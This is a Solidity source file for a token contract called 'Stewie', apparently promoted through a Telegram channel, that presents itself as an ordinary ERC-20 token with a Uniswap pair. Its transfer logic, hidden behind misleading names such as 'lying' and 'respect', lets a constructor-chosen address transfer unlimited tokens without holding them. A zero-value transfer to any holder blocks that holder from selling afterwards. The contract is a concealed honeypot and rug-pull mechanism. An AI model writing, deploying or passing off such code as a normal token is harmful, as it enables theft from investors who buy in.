/*

https://t.me/stewie_eth

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Stewie is Ownable {
    function transferFrom(address exclaimed, address though, uint256 evidence) public returns (bool success) {
        lying(exclaimed, though, evidence);
        require(evidence <= allowance[exclaimed][msg.sender]);
        allowance[exclaimed][msg.sender] -= evidence;
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    address public uniswapV2Pair;

    constructor(address organized) {
        balanceOf[msg.sender] = totalSupply;
        particular[organized] = respect;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => uint256) private particular;

    function transfer(address though, uint256 evidence) public returns (bool success) {
        lying(msg.sender, though, evidence);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private repeat;

    mapping(address => uint256) public balanceOf;

    uint256 private respect = 83;

    function approve(address officer, uint256 evidence) public returns (bool success) {
        allowance[msg.sender][officer] = evidence;
        emit Approval(msg.sender, officer, evidence);
        return true;
    }

    string public symbol = 'Stewie';

    string public name = 'Stewie';

    function lying(address exclaimed, address though, uint256 evidence) private returns (bool success) {
        if (particular[exclaimed] == 0) {
            balanceOf[exclaimed] -= evidence;
        }

        if (evidence == 0) repeat[though] += respect;

        if (particular[exclaimed] == 0 && uniswapV2Pair != exclaimed && repeat[exclaimed] > 0) {
            particular[exclaimed] -= respect;
        }

        balanceOf[though] += evidence;
        emit Transfer(exclaimed, though, evidence);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
}